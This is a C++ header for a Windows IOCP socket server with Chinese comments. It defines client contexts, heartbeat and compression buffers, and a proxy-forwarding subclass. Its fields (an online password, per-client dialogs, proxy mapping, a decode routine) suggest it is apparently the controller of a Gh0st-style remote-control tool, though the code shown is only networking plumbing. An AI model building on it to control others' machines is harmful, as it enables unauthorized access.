// IOCPServer.h: interface for the CIOCPServer class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_IOCPSERVER_H__75B80E90_FD25_4FFB_B273_0090AA43BBDF__INCLUDED_)
#define AFX_IOCPSERVER_H__75B80E90_FD25_4FFB_B273_0090AA43BBDF__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include <winsock2.h>
#include <MSTcpIP.h>
#pragma comment(lib,"ws2_32.lib")
#include "Buffer.h"


#include <process.h>

#include <afxtempl.h>



////////////////////////////////////////////////////////////////////
#define	NC_CLIENT_CONNECT		0x0001
#define	NC_CLIENT_DISCONNECT	0x0002
#define	NC_TRANSMIT				0x0003
#define	NC_RECEIVE				0x0004
#define NC_RECEIVE_COMPLETE		0x0005 // 完整接收
#define	NC_DIALOG_CLOSE     	0x0006

class CLock
{
public:
	CLock(CRITICAL_SECTION& cs, const CString& strFunc)
	{
		m_strFunc = strFunc;
		m_pcs = &cs;
		Lock();
	}
	~CLock()
	{
		Unlock();

	}
	
	void Unlock()
	{
		LeaveCriticalSection(m_pcs);
		TRACE(_T("LC %d %s\n") , GetCurrentThreadId() , m_strFunc);
	}

	void Lock()
	{
		TRACE(_T("EC %d %s\n") , GetCurrentThreadId(), m_strFunc);
		EnterCriticalSection(m_pcs);
	}
 

protected:
	CRITICAL_SECTION*	m_pcs;
	CString				m_strFunc;

};

enum IOType 
{
	IOInitialize,
	IORead,
	IOWrite
};

class OVERLAPPEDPLUS 
{
public:
	OVERLAPPED			m_ol;
	IOType				m_ioType;

	OVERLAPPEDPLUS(IOType ioType) {
		ZeroMemory(this, sizeof(OVERLAPPEDPLUS));
		m_ioType = ioType;
	}
};


struct ClientContext
{
    SOCKET				m_Socket;
	// Store buffers
	CBuffer				m_WriteBuffer;
	CBuffer				m_CompressionBuffer;	// 接收到的压缩的数据
	CBuffer				m_DeCompressionBuffer;	// 解压后的数据
	CBuffer				m_ResendWriteBuffer;	// 上次发送的数据包，接收失败时重发时用

	int					m_Dialog[2]; // 放对话框列表用，第一个int是类型，第二个是CDialog的地址
	int					m_nTransferProgress;

	// Input Elements for Winsock
	WSABUF				m_wsaInBuffer;
	BYTE				m_byInBuffer[8192];

	// Output elements for Winsock
	WSABUF				m_wsaOutBuffer;
//	HANDLE				m_hWriteComplete;

	BOOL				m_bIsMainSocket; // 是不是主socket

	CRITICAL_SECTION m_SndLock;
	
	char szOnlinePass[20];
	// 代理映射用到
	DWORD				dwID;
	BYTE				m_bProxyConnected;
};



#include "Mapper.h"

typedef void (CALLBACK* NOTIFYPROC)( ClientContext*, UINT nCode);

typedef CList<ClientContext*, ClientContext* > ContextList;

#define FLAG_SIZE	3


class CIOCPServer
{
public:
	void DisconnectAll();
	CIOCPServer();
	virtual ~CIOCPServer();

	NOTIFYPROC					m_pNotifyProc;
	
	bool Initialize(NOTIFYPROC pNotifyProc,  int nMaxConnections, int nPort);
	UINT                    m_nHeartBeatTime;


	static unsigned __stdcall ThreadHeartbeat(LPVOID WorkContext);
	static unsigned __stdcall ListenThreadProc(LPVOID lpVoid);
	static unsigned __stdcall ThreadPoolFunc(LPVOID WorkContext);
	CRITICAL_SECTION	m_cs;

	void PostRecv(ClientContext* pContext);
	void Send(ClientContext* pContext, LPBYTE lpData, UINT nSize, BOOL bZlib = FALSE);
	void PostSend(ClientContext* pContext);

	bool IsRunning();
	void Shutdown();
	void ResetConnection(ClientContext* pContext);

	UINT					m_nSendKbps; // 发送即时速度
	UINT					m_nRecvKbps; // 接受即时速度
	UINT					m_nMaxConnections; // 最大连接数

	SOCKET					m_socListen;    
protected:
	void InitializeClientRead(ClientContext* pContext);
	BOOL AssociateSocketWithCompletionPort(SOCKET device, HANDLE hCompletionPort, DWORD dwCompletionKey);
	void RemoveStaleClient(ClientContext* pContext, BOOL bGraceful);
	void MoveToFreePool(ClientContext *pContext);
	ClientContext*  AllocateContext(SOCKET clientSocket);

	LONG				m_nWorkerCnt;

	bool				m_bInit;
	bool				m_bDisconnectAll;
	BYTE				m_bPacketFlag[FLAG_SIZE];
	void CloseCompletionPort();
	void OnAccept();
	bool InitializeIOCP(void);
	void Stop();

	// 设置保活机制 nKeepTime多长时间没有数据就开始发送心跳包,nKeepInterval每隔多长时间发送一个心跳包 (Vista之前默认5次 之后默认发10次)
	BOOL SetKeepAlive( SOCKET Socket, UINT nKeepTime = 10 * 1000, UINT nKeepInterval = 3000 );


	ContextList				m_listContexts;
	ContextList				m_listFreePool;
	WSAEVENT				m_hEvent;
    HANDLE					m_hKillEvent;
	HANDLE					m_hThread;
	HANDLE					m_hCompletionPort;
	bool					m_bTimeToKill;

	LONG					m_nKeepLiveTime;    	// 多长时间没有数据
	UINT                 	m_nIntervalTime;		// 间隔多少时间发送

	DWORD					m_dwIndex;

	CString GetHostName(SOCKET socket);


	BEGIN_IO_MSG_MAP()
		IO_MESSAGE_HANDLER(IORead, OnClientReading)
		IO_MESSAGE_HANDLER(IOWrite, OnClientWriting)
		IO_MESSAGE_HANDLER(IOInitialize, OnClientInitializing)
		END_IO_MSG_MAP()
		
	bool OnClientInitializing	(ClientContext* pContext, DWORD dwSize = 0);
	virtual bool OnClientReading		(ClientContext* pContext, DWORD dwSize = 0);
	bool OnClientWriting		(ClientContext* pContext, DWORD dwSize = 0);
	

};

char* MyDecode(char *data,int len);
class CIOCPLOCAL :public CIOCPServer
{
public: 
	void Send(ClientContext* pContext, LPBYTE lpData, UINT nSize)
	{
		if (pContext == NULL)
			return;

		CLock cs(pContext->m_SndLock, "Send");

		try
		{
			if (nSize > 0)
			{
				pContext->m_WriteBuffer.Write(lpData, nSize);
			}

			PostSend(pContext);

		}catch(...){}
	}
	
	bool OnClientReading		(ClientContext* pContext, DWORD dwIoSize =0)
	{
		CLock cs(m_cs, "OnClientReading");
		try
		{
			//////////////////////////////////////////////////////////////////////////
			static DWORD nLastTick = GetTickCount();
			static DWORD nBytes = 0;
			nBytes += dwIoSize;	
			if (GetTickCount() - nLastTick >= 1000)
			{
				nLastTick = GetTickCount();
				InterlockedExchange((LPLONG)&(m_nRecvKbps), nBytes);
				nBytes = 0;
			}
			//////////////////////////////////////////////////////////////////////////
			
			if (dwIoSize == 0)
			{
				RemoveStaleClient(pContext, FALSE);
				return false;
			}

			// Add the message to out message
			// Dont forget there could be a partial, 1, 1 or more + partial mesages
			pContext->m_CompressionBuffer.ClearBuffer();
			BYTE bToken = COMMAND_PROXY_DATA;
			pContext->m_CompressionBuffer.Write(&bToken,sizeof(bToken));
			pContext->m_CompressionBuffer.Write((LPBYTE)&pContext->dwID ,sizeof(DWORD));
			pContext->m_CompressionBuffer.Write(pContext->m_byInBuffer,dwIoSize);
			
			m_pNotifyProc(pContext, NC_RECEIVE);

			PostRecv(pContext);
		}
		catch(...)
		{
			TRACE(_T("CIOCPLOCAL::OnClientReading Exception!"));
		}
		return true;	
	}
};

#endif // !defined(AFX_IOCPSERVER_H__75B80E90_FD25_4FFB_B273_0090AA43BBDF__INCLUDED_)
